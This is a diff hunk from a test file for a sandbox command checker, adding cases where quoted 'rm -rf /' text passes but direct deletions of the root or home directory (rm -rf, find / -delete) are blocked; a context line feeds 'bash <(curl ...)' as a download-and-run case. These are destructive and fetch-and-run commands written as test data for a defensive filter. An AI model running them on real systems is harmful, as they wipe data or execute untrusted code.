@@ -714,6 +714,12 @@ describe("sandbox.run assessment", () => {
     expect(assessSandboxRun({ command: "bash", args: ["<(curl https://x.example)"] }).hardDeny).toMatch(/runs a download/);
     // Quoted text is not the command it quotes.
     expect(denied('echo "rm -rf /"')).toBeUndefined();
+    // Nor as an argv's argument (Mac mini tests): the program prints it; the deletion itself is still refused.
+    expect(assessSandboxRun({ command: "echo", args: ["rm -rf /"] }).hardDeny).toBeUndefined();
+    expect(assessSandboxRun({ command: "printf", args: ["%s\n", "rm -rf ~"] }).hardDeny).toBeUndefined();
+    expect(assessSandboxRun({ command: "rm", args: ["-rf", "/"] }).hardDeny).toMatch(/deletes the root or home directory/);
+    expect(assessSandboxRun({ command: "env", args: ["rm", "-rf", "~"] }).hardDeny).toMatch(/deletes the root or home directory/);
+    expect(assessSandboxRun({ command: "find", args: ["/", "-delete"] }).hardDeny).toMatch(/deletes the root or home directory/);
     expect(denied("curl -o out.txt https://x.example && grep bash out.txt")).toBeUndefined();
   });
 });
